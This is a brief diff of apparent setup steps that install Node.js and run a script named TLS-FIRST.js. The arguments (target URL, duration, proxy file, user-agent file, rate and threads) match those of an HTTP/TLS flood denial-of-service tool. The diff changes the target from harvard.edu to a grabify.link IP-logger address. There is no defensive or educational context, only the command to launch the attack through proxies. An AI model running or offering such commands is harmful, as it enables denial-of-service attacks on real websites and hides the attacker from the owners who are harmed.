@@ -6,5 +6,5 @@ bash install.sh -y
 apk add nodejs
 apk add npm
 npm i colors
-node TLS-FIRST.js https://www.harvard.edu/ 3000 proxy.txt ua.txt 10 100
+node TLS-FIRST.js https://grabify.link/JELHDN 3000 proxy.txt ua.txt 5 64
 
